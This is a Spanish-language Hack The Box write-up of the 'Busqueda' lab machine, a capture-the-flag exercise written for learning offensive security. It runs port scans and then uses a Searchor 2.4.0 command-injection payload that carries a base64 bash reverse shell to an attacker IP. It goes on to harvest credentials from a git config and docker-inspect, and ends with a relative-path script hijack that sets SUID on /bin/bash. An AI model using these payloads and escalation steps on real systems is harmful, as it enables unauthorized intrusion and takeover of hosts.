# Busqueda

- **Plataforma:** HTB 
- **Fecha de resolución:** 11/11/2025
- **Autor:** Albr_0x4a

---

## Escaneo de Puertos con Nmap

- **Identificar puertos abiertos:**

- **Comando:** nmap -p- -n -Pn --min-rate 5000 -sS $IP

- **Identificar servicios y versiones en los puertos abiertos:**

- **Comando:** nmap -p22,80 -sCV $IP

```bash
# Nmap 7.94SVN scan initiated Tue Nov 11 12:21:34 2025 as: nmap -p22,80 -n -Pn -sCV -oN ports 10.10.11.208
Nmap scan report for 10.10.11.208
Host is up (0.100s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov 11 12:21:45 2025 -- 1 IP address (1 host up) scanned in 10.13 seconds
```

## Explorando Servicio Web

- Primero que todo añadimos `searcher.htb` al archivo `/etc/hosts`, luego entramos a la página web y nos encontramos con un buscador web, y después de enumerar un poco encontramos que se está utilizando `searchor 2.4.0`, con una simple búsqueda en internet se puede ver que está versión posee una vulnerabilidad de ejecución remota de código:
  
![](./screenshots/web_page.png)

## Explotando Servicio Vulnerable

- Encontré en internet este [poc](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection), que me ayudó a explotar la vulnerabilidad y obtener una reverse shell:
  
```bash
❯ rev_shell_b64=$(echo -ne "bash  -c 'bash -i >& /dev/tcp/10.10.14.2/1234 0>&1'" | base64)
❯ evil_cmd="',__import__('os').system('echo ${rev_shell_b64}|base64 -d|bash -i')) #"
❯ evil_cmd=$(echo ${evil_cmd} | sed -r 's/[+]+/%2B/g')
❯ echo ${evil_cmd}
',__import__('os').system('echo YmFzaCAgLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi8xMjM0IDA%2BJjEn|base64 -d|bash -i')) #
```
```bash
❯ curl -v -X POST http://searcher.htb/search -d "engine=Google&query=${evil_cmd}"
Note: Unnecessary use of -X or --request, POST is already inferred.
* Host searcher.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.208
*   Trying 10.10.11.208:80...
* Connected to searcher.htb (10.10.11.208) port 80
* using HTTP/1.x
> POST /search HTTP/1.1
> Host: searcher.htb
> User-Agent: curl/8.14.1
> Accept: */*
> Content-Length: 145
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 145 bytes
```
```bash
❯ nc -lvnp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.11.208 32890
bash: cannot set terminal process group (1643): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ 
```
## Escalando Privilegios

- Una vez dentro obtenemos la primera flag y empezamos a enumerar para escalar privilegios:
  
```bash
svc@busqueda:~$ whoami
svc
svc@busqueda:~$ ls
user.txt
```

- Luego de un rato enumerando, encontramos el archivo `/var/www/app/.git/config`, que contiene información valiosa:

```bash
svc@busqueda:/var/www/app/.git$ cat config 
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```  

- El archivo anterior contiene credenciales para acceder al sitio `gitea.searcher.htb`, el cual agregamos a nuestro archivo `/etc/hosts`
  
`cody:jh1usoih2bkjaspwe92`

- Al entrar al sitio web `gitea.searcher.htb` y utilizar las credenciales obtenidas anteriormente, vemos el código del sitio web `searcher.htb` y un usuario `administrator` que no podemos ver sus proyectos privados ya que no poseemos su contraseña.
  
![](./screenshots/gitea_svc.png)

- Como este proyecto se está ejecutando bajo el usuario `svc`, con el cual obtuvimos ejecución remota de código, podemos probar si se está utilizando la misma contraseña `jh1usoih2bkjaspwe92`, para así poder enumerar más en profundidad. Lo cual logramos exitosamente:

```bash
svc@busqueda:/var/www/app/.git$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

- Podemos ver anteriormente que tenemos permisos para ejecutar como administrador el script `/opt/scripts/system-checkup.py`, y al ejecutarlo vemos que al parecer podemos utilizar comandos de docker:

```bash
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py --help
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

- Primero ejecutamos `docker-ps` y obtenemos los contenedores que se están ejecutando:
  
```bash
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   2 years ago   Up 2 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   2 years ago   Up 2 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

- Con esta información podemos ejecutar `docker-inspect` que nos permite ver la configuración de estos contenedores, y con suerte encontrar credenciales o información valiosa, empezamos por `gitea`:
  - Este [recurso](https://docs.docker.com/engine/cli/formatting/) me ayudó a entender la sintaxis de docker-inspect

```bash
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
{
  "Id": "960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb",
  "Created": "2023-01-06T17:26:54.457090149Z",
  "Path": "/usr/bin/entrypoint",
  "Args": [
    "/bin/s6-svscan",
    "/etc/s6"
  ],
  "State": {
    "Status": "running",
    "Running": true,
    .....
```
- Al revisar la salida, encontramos credenciales:

```bash
"Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"
    ],
```
- Con la contraseña `yuiu1hoiu4i5ho1uh`, podemos iniciar sesión como el usuario `administrator` en el sitio web `gitea.searcher.htb`, y logramos ver el código del script que ejecutamos anteriormente:
  
![](./screenshots/administrator_gitea.png)

- Al revisar el código, llama la atención el siguiente bloque, ya que se está llamando a otro script mediante su ruta relativa, lo cual podemos aprovechar para crear un script malicioso y escalar privilegios a root:

```bash
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```
- Si ejecutamos el script con la opción `full-checkup` en otro directorio que no sea `/opt/scripts/`, obtenemos un error, lo cual nos confirma nuestro planteamiento anterior:

```bash
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong
```

- Para aprovecharnos de esto, creamos un script con el nombre `full-checkup.sh`:

```bash
svc@busqueda:~$ cat full-checkup.sh 
#!/bin/bash

chmod +s /bin/bash
```
  - Este script le asigna el byte SUID al binario `/bin/bash`, para permitirnos lanzar una shell con privilegios root

- Ya con el archivo creado, le damos permisos de ejecución y ejecutamos el script `/opt/scripts/system-checkup.py` con la opción `full-checkup`, y revisamos si funcionó:
  
```bash
svc@busqueda:~$ chmod +x full-checkup.sh 
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:~$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```
- Podemos observar anteriormente que todo funcionó de manera exitosa, por lo que ahora podemos lanzar una shell con privilegios root y obtener la flag:
  
```bash
svc@busqueda:~$ bash -p
bash-5.1# whoami
root
bash-5.1# ls /root/
ecosystem.config.js  root.txt  scripts	snap
```
